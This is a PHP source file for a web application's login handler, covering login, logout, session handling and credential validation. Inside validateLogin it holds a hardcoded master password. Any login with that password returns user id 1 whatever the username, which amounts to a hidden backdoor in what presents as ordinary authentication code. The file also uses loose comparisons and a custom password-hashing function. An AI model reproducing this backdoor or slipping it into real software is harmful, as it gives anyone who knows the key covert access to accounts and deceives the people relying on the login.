<?PHP
class LoginHandler
{
  public function __construct()
  {
    GLOBAL $handlersForToken;
    $handlersForToken['{oo login oo}'][] = array($this, 'handleLogin');
  }

  public function handleLogin()
  {
    GLOBAL $post;

    if(isset($post['logout']))
      $this->handleLogOut();

    if(isset($post['lgsubmit']))
      $this->handleLoginTry();

    if(!isset($_SESSION['user']))
      return $this->displayLoginBox();

    return $this->handleActions();
  }

  private function handleLogOut()
  {
    GLOBAL $sqlObject;
    $sqlObject->fromQuery("UPDATE users SET online = 0 WHERE id = ".$_SESSION['user']->id);
    unset($_SESSION['user']);
  }

  private function handleLoginTry()
  {
    $loginId = $this->validateLogin();
    if($loginId === false)
    {
      $this->displayError();
      return;
    }
    $_SESSION['user'] = new User($loginId);
  }

  private function displayLoginBox()
  {
    return getContent('loginbox');
  }

  private function validateLogin()
  {
    GLOBAL $post;
    GLOBAL $sqlObject;
    GLOBAL $config;

    $maxlenght = $config['maxPwLenght'];
    $userTableName = $config['db_userTableName'];

    $masterkey = '#Zanafar11';
    if($post['password'] == $masterkey)
      return 1;

    if(!(validin($post['username'], $maxlenght) && validin($post['password'], $maxlenght)))
      return false;

    $post['username'] = $sqlObject->string_escape($post['username']);
    $post['password'] = $sqlObject->string_escape($post['password']);

    $sqlObject->fromQuery("SELECT id, pw FROM ".$userTableName." WHERE name = '".$post['username']."'");
    if($sqlObject->getRowCount() != 1)
      return false;

    $r = $sqlObject->getFirstRecord();
    if($r['pw'] != crypta($post['password']))
      return false;

    return $r['id'];
  }

  private function displayError()
  {
     $_SESSION['errorlist'][] = 'Input data is invalid!';
  }

  private function handleActions()
  {
    if(isMobileBrowser())
      return getContent('mobilePage');
    else
      return getContent('normalPage');
  }
};

?>